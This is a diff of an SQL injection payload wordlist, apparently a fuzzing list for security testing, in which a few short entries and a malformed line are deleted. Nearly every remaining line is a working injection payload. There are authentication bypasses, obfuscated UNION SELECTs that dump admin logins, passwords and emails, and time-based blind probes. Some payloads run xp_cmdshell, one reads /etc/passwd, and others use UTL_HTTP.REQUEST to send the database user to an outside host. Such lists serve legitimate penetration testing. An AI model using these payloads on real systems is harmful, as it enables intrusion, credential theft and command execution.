@@ -3,12 +3,8 @@
 " or ""-"
 " or ""^"
 " or "x"="x
-"&"
 ") or ("x")=("x
 ")) or (("x"))=(("x
-"*"
-"-"
-"^"
 %27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23 
 %31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23 
 ' UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1) 
@@ -29,24 +25,19 @@
 '%20AND%20SLEEP(10)=' 
 '%20or%20''='
 '%20or%20'x'='x
-'&'
 ') or ('a'='a
 ') or ('x')=('x
 ')%20or%20('x'='x
 ')) or (('x'))=(('x
 '); exec sp_executesql('W'+'ait'+'for'+' '+'de'+'lay'+' '+'00:00:40');-- 
-'*'
 '+or+1=utl_http.request('http://host/'||(select+user+from+dual))-- 
 '+or+round(pi(),1)+true+true = version() 
 '+where+(0)=0 
-'-'
 '; EXEC ('SEL' + 'ECT US' + 'ER') 
 '; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER' 
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 ';/*&iid=1*/ EXEC/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ "ping 127.0.0.1" /*&iid=1*/-- 
 ';/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ "ping 127.0.0.1" /*,1*/-- 
-'=' 
-'^'
 'hi' or 'x'='x';
 'union select 1,load_file(0x2f6574632f706173737764),3 from users-- 
 '||UTL_HTTP.REQUEST('http://somehost/')||' 
@@ -70,7 +61,6 @@
 -20+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
 -20+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
 -20+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
--20+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
 -20+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
 -2‘ and substr((select max(pass) from users),1,1)=’a
 -2‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a
@@ -186,7 +176,6 @@
 20+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
 20+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
 20+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
-20+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
 20+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
 8888'+AND+'1'+LIKE+'1 -->
 8888'+AND+'2'+LIKE+'1 -->
@@ -269,7 +258,6 @@ null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3
 null+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
 null+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
 null+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
-null+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
 null+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
 union(select(version())) 
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
